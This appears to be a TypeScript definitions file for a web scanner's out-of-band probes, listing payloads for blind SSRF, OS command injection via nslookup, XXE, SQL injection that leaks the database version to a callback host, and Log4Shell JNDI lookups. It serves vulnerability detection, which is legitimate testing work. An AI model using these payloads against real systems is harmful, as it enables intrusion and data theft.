import type { Severity } from "@/stores/findings";

import type { PointKind } from "./probes";

export interface BlindProbe {
  id: string;
  name: string;
  severity: Severity;
  cwe?: string;
  points: PointKind[] | "all";

  payloads: (oastHost: string) => string[];
}

export const BLIND_PROBES: BlindProbe[] = [
  {
    id: "blind-ssrf",
    name: "Blind SSRF (out-of-band)",
    severity: "high",
    cwe: "CWE-918",
    points: "all",
    payloads: (h) => [`http://${h}/`, `https://${h}/`, `//${h}`, h],
  },
  {
    id: "blind-rce",
    name: "Blind OS command injection (out-of-band)",
    severity: "critical",
    cwe: "CWE-78",
    points: "all",
    payloads: (h) => [`;nslookup ${h}`, `|nslookup ${h}`, `$(nslookup ${h})`, `\`nslookup ${h}\``, `&&nslookup ${h}`, `&nslookup ${h}&`],
  },
  {
    id: "blind-xxe",
    name: "Blind XXE (out-of-band)",
    severity: "high",
    cwe: "CWE-611",
    points: "all",
    payloads: (h) => [`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://${h}/x">%x;]><r>1</r>`],
  },
  {
    id: "blind-sqli",
    name: "Blind SQL injection (out-of-band)",
    severity: "high",
    cwe: "CWE-89",
    points: "all",
    payloads: (h) => [
      `';declare @q varchar(200);set @q='\\\\${h}\\a';exec master..xp_dirtree @q;--`,
      `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.${h}\\\\a'))-- -`,
    ],
  },
  {
    id: "blind-jndi",
    name: "JNDI / Log4Shell (out-of-band)",
    severity: "critical",
    cwe: "CWE-502",
    points: "all",
    payloads: (h) => [`\${jndi:ldap://${h}/a}`, `\${jndi:dns://${h}/a}`, `\${jndi:rmi://${h}/a}`],
  },
];
